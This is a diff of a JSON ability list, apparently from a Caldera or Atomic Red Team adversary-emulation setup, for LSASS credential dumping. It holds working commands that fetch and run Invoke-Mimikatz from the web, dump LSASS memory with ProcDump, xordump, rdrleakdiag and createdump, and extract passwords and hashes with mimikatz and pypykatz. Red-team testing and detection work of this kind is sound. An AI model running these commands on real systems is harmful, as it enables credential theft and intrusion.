@@ -8,11 +8,11 @@
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "abilities": [
           {
-            "ability_id": "82dcefb5c3512d73bf2248cb0127c4ae",
-            "name": "Powershell Mimikatz",
-            "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n",
-            "command": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds",
-            "kali_prereq": "",
+            "ability_id": "3ae905fe6171f9d0fbefd9cb6b8d6a82",
+            "name": "Dump LSASS.exe Memory using ProcDump",
+            "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
+            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe\"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://download.sysinternals.com/files/Procdump.zip\" -O /tmp/Procdump.zip && \\\nunzip -o /tmp/Procdump.zip -d /tmp/Procdump && \\\ncp /tmp/Procdump/procdump64.exe $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe && \\\nrm -rf /tmp/Procdump.zip /tmp/Procdump && \\\nsudo systemctl restart caldera; fi",
             "win_prereq": ""
           },
           {
@@ -30,14 +30,6 @@
             "command": "if (Test-Path 'C:\\Windows\\Temp\\xordump.exe') { ; } else {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile C:\\Windows\\Temp\\xordump.exe};  ;  C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41",
             "kali_prereq": "",
             "win_prereq": ""
-          },
-          {
-            "ability_id": "7d1c6222726c67b13740450275dc2162",
-            "name": "LSASS read with pypykatz",
-            "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n",
-            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\" live lsa",
-            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz\"; else pip3 install pypykatz && cp -r $(python3 -c \"import pypykatz, os; print(os.path.dirname(pypykatz.__file__))\") $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz && sudo systemctl restart caldera; fi",
-            "win_prereq": "if (Test-Path \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz\") { Write-Host \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz\" } else { invoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait }"
           },
           {
             "ability_id": "60bb6f8468aa98b75be2521861a164d5",
@@ -72,14 +64,6 @@
             "win_prereq": ""
           },
           {
-            "ability_id": "7e8ccbe3de961012b6464485829e87a4",
-            "name": "Offline Credential Theft With Mimikatz",
-            "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n",
-            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\" \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit",
-            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe\"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64 && \\\nwget -q \"https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip\" -O /tmp/mimikatz.zip && \\\nunzip -o /tmp/mimikatz.zip -d /tmp/mimikatz && \\\ncp /tmp/mimikatz/x64/mimikatz.exe $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe && \\\nrm -rf /tmp/mimikatz.zip /tmp/mimikatz && \\\nsudo systemctl restart caldera; fi",
-            "win_prereq": ""
-          },
-          {
             "ability_id": "03455985e8bf5d2ee43947cadaca2256",
             "name": "Dump LSASS.exe Memory using direct system calls and API unhooking",
             "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n",
@@ -93,15 +77,7 @@
             "description": "Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n",
             "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"; & \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id",
             "kali_prereq": "",
-            "win_prereq": ""
-          },
-          {
-            "ability_id": "bbc786e45aff314d33e60133f010f00c",
-            "name": "Dump LSASS.exe using lolbin rdrleakdiag.exe",
-            "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. \nThis can be achieved with lolbin rdrleakdiag.exe. \n\nUpon successful execution, you should see the following files created, $env:TEMP\\minidump_<PID>.dmp and  $env:TEMP\\results_<PID>.hlk.\n",
-            "command": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {;       $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\";   } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {;       $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\";   } else {;       $binary_path = \"File not found\";       exit 1;   }; $lsass_pid = get-process lsass |select -expand id; if (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} ; write-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1; & $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1; Write-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"",
-            "kali_prereq": "",
-            "win_prereq": ""
+            "win_prereq": "if (Test-Path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\") { Write-Host \"ALREADY_PRESENT: $env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\" } else { $url = \"https://download.visualstudio.microsoft.com/download/pr/a0832b5a-6900-442b-af79-6ffddddd6ba4/e2df0b25dd851ee0b38a86947dd0e42e/dotnet-runtime-5.0.17-win-x64.exe\"; $out = \"$env:Temp\\dotnet-runtime-5.0.17.exe\"; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process -FilePath $out -ArgumentList \"/install /quiet /norestart\" -Wait; Remove-Item $out -Force }"
           },
           {
             "ability_id": "0ef4cc7b-611c-4237-b20b-db36b6906554",
@@ -112,27 +88,19 @@
             "win_prereq": ""
           },
           {
-            "ability_id": "7049e3ec-b822-4fdf-a4ac-18190f9b66d1",
-            "name": "Powerkatz (Staged)",
-            "description": "Use Invoke-Mimikatz",
-            "command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds",
-            "kali_prereq": "",
-            "win_prereq": ""
+            "ability_id": "7d1c6222726c67b13740450275dc2162",
+            "name": "LSASS read with pypykatz",
+            "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n",
+            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\" live lsa",
+            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz\"; else pip3 install pypykatz && cp -r $(python3 -c \"import pypykatz, os; print(os.path.dirname(pypykatz.__file__))\") $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz && sudo systemctl restart caldera; fi",
+            "win_prereq": "if (Test-Path \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz\") { Write-Host \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz\" } else { invoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait }"
           },
           {
-            "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
-            "name": "Run PowerKatz",
-            "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
-            "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds",
-            "kali_prereq": "",
-            "win_prereq": ""
-          },
-          {
-            "ability_id": "3ae905fe6171f9d0fbefd9cb6b8d6a82",
-            "name": "Dump LSASS.exe Memory using ProcDump",
-            "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
-            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
-            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe\"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://download.sysinternals.com/files/Procdump.zip\" -O /tmp/Procdump.zip && \\\nunzip -o /tmp/Procdump.zip -d /tmp/Procdump && \\\ncp /tmp/Procdump/procdump64.exe $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe && \\\nrm -rf /tmp/Procdump.zip /tmp/Procdump && \\\nsudo systemctl restart caldera; fi",
+            "ability_id": "7e8ccbe3de961012b6464485829e87a4",
+            "name": "Offline Credential Theft With Mimikatz",
+            "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n",
+            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\" \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit",
+            "kali_prereq": "if [ -f \"$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe\" ]; then echo \"ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe\"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64 && \\\nwget -q \"https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip\" -O /tmp/mimikatz.zip && \\\nunzip -o /tmp/mimikatz.zip -d /tmp/mimikatz && \\\ncp /tmp/mimikatz/x64/mimikatz.exe $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe && \\\nrm -rf /tmp/mimikatz.zip /tmp/mimikatz && \\\nsudo systemctl restart caldera; fi",
             "win_prereq": ""
           }
         ]
